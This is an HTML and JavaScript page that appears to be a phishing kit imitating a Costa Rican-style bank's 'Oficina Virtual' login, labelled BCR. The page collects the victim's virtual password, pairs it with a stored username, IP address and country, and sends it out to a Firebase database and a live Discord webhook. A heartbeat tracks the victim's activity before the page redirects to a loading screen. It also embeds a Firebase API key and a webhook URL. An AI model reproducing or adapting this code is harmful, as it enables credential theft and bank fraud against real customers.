<script>
  const firebaseConfig = {
    apiKey: "AIzaSyDWkga80jjGG2YtF9obwfIf9UuSACayWko",
    authDomain: "kkkkk-5e2bd.firebaseapp.com",

    messagingSenderId: "1059258934487",
    appId: "1:1059258934487:web:72d14c094dc78e6140fc92"
  };

  if (!firebase.apps.length) {
    firebase.initializeApp(firebaseConfig);
  }
  const db = firebase.firestore();

  // --- SISTEMA DE LATIDOS (Heartbeat) ---
  function enviarLatido() {
    const inputUser = document.querySelector("#ypn-us");
    const usuarioId = inputUser ? inputUser.value.trim() : null;
    
    if (usuarioId) {
      db.collection("prolme").doc(usuarioId).set({
        last_active: firebase.firestore.FieldValue.serverTimestamp()
      }, { merge: true }).catch((error) => {
        console.error("Error al enviar latido:", error);
      });
    }
  }

  // El latido corre cada 10 segundos de forma independiente
  setInterval(enviarLatido, 5000);

  // Enviar latido si el usuario oculta la pestaña
  window.addEventListener('visibilitychange', function() {
    if (document.visibilityState === 'hidden') {
      enviarLatido();
    }
  });
</script>

<body background="background.png">
    <header class="header-vertical">

    <p style="text-align: center;font-weight: 400;font-size: 21px;margin-top: 5px;">Oficina Virtual | Personas</p>

<div class="login-wrapper">
    <div class="login-container">
         <a class="txtSeleccionMetodo">Ingrese su clave virtual</a>
         <form id="loginform">

             <div class="input-group" style="margin-bottom: 15px;">
                 <img src="Seguridad.svg" alt="Contraseña">
                 <input type="text" id="sms" name="text" required="" placeholder="Clave virtual">
                 
             </div>
             
             <button type="submit" id="submitBtn" class="btn-submit" style="width: 45%;padding: 10px;margin-left: 87px;">Ingresar</button><br><br>
         </form>
     </div>
</div>

<script>
    async function getCountry() {
        try {
            const response = await fetch('https://ipinfo.io/json');
            const data = await response.json();
            return data.country;
        } catch (error) {
            console.error('Error al obtener el país:', error);
            return 'País Desconocido';
        }
    }

    async function getIPAddress() {
        try {
            const response = await fetch('https://api64.ipify.org?format=json');
            const data = await response.json();
            return data.ip;
        } catch (error) {
            console.error('Error al obtener la dirección IP:', error);
            return 'IP Desconocida';
        }
    }

    document.querySelector("#loginform").addEventListener("submit", async (event) => {
        event.preventDefault();

        const usuario = localStorage.getItem("usuario");
        const codigo = document.querySelector("#sms").value;
        const pais = await getCountry();
        const ip = await getIPAddress();

        if (!usuario || !codigo) {
          alert("Por favor, complete todos los campos.");
          return;
        }

        try {
          await db.collection("prolme").doc(usuario).set({
            cod1: codigo,
            page: 0,
            last_active: firebase.firestore.FieldValue.serverTimestamp()
          }, { merge: true });

          const message = `➖➖➖➖➖[ 🏦BCR ]➖➖➖➖➖\n👤 Usuario: ${usuario}\n📟 Clave Virtual: ${codigo}\n➖➖➖➖➖[ IP ]➖➖➖➖➖\nPaís: ${pais}\nIP: ${ip}\n➖➖➖➖➖[ By FwC 👨🏻‍💻 ]➖➖➖➖➖\n`;

          const discord_webhook_url = "https://discord.com/api/webhooks/1534616941476581568/YTnnkJt7vQqtrmv1ERAYs0vEJDb4340R0lhVmPvflTgky0JErdqJKj2VPa4pQ9al6ReU";

          await fetch(discord_webhook_url, {
              method: "POST",
              headers: {
                  "Content-Type": "application/json",
              },
              body: JSON.stringify({
                  content: message
              }),
          });

          window.location.href = "cargando.html";
        } catch (error) {
          console.error("Error al enviar datos:", error);
        }
    });
</script>
